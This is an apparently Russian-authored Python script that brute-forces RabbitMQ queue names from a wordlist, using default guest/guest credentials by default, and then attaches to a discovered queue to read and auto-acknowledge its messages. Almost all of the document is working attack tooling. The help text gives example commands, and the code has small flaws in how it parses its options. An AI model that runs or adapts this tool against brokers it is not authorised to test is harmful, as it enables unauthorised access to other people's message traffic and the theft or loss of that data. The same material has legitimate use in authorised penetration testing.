import pika
import pika.exceptions
from sys import argv
from datetime import datetime
import time


# заглушка для энама
def useless_callback():
    return 1


def callback(ch, method, properties, body):
    print(f'--> Received body:\n--{datetime.now().strftime("%H:%M:%S")}--\n{body.decode("utf-8")}\n')


# перечисление очередей
def queue_enum(ip_addr, enum_list_file, user, passwd, delay, port):
    exist_queue = []
    credentials = pika.PlainCredentials(user, passwd)

    with open(enum_list_file, 'r') as list:
        for i in list:

            if delay:
                time.sleep(float(delay))

            try:

                connection = pika.BlockingConnection(pika.ConnectionParameters(
                    ip_addr,
                    port,
                    '/',
                    credentials))
                print(f'--{datetime.now()}--')
                channel = connection.channel()
                queue_name = i.strip()
                channel.basic_consume(queue_name, useless_callback, auto_ack=True)
                connection.close()
                exist_queue.append(queue_name)

            except pika.exceptions.ProbableAuthenticationError:
                print('Invalid creds')
                break

            except pika.exceptions.ChannelClosedByBroker:
                pass

            except pika.exceptions.AMQPConnectionError:
                print('Miss connection, check port number')
                break

    return exist_queue


# подключение к очереди
def queue_connect(ip_addr, queue_name):
    connection = pika.BlockingConnection(pika.ConnectionParameters(
        host=ip_addr))
    channel = connection.channel()
    channel.basic_consume(queue_name, callback, auto_ack=True)
    channel.start_consuming()


# основная функция, передаются параметры запуска с консоли через  argv
def run(argv):
    if argv[1] == 'enum':

        delay = 0
        port = 5672
        if '--delay' in argv:
            delay = argv[argv.index('--delay') + 1]

        elif '--port' in argv:
            port = argv[argv.index('--port') + 1]

        exsist_queue = queue_enum(argv[argv.index('-a') + 1], argv[argv.index('-l') + 1], argv[argv.index('-u') + 1],
                                  argv[argv.index('-p') + 1], delay, port)
        for i in exsist_queue:
            print(i)

    elif argv[1] == 'listen':
        print(f"Receivin messages from {argv[argv.index('-n') + 1]}:")
        queue_connect(argv[argv.index('-a') + 1], argv[argv.index('-n') + 1])

    elif argv[1] == '-h':
        print(
            "Sript for brute RabbitMQ queus and connect to queue\nNote:\n * is required option\n guest guest is default rabbitmq creds\n\nMODE:\n - enum\n - listen\n\nENUM OPTIONS:\n -a* - ip address or domain name rabbitmq host\n -u* - rabbitmq login\n -p* - rabbitmq password\n -l* - list file\n -d  - delay (in seconds, default RPS around 60 requests)\n\nLISTEN OPTIONS:\n -a* - ip address or domain name rabbitmq host\n -n* - name of exist queue\n\nEXAMPLES:\npython .\r mq_qp.py enum -a 192.168.1.71 -u guest -p guest -l list2.txt -d 1\npython .\r mq_qp.py listen -a 192.168.1.71 -n queuename"
        )


run(argv)
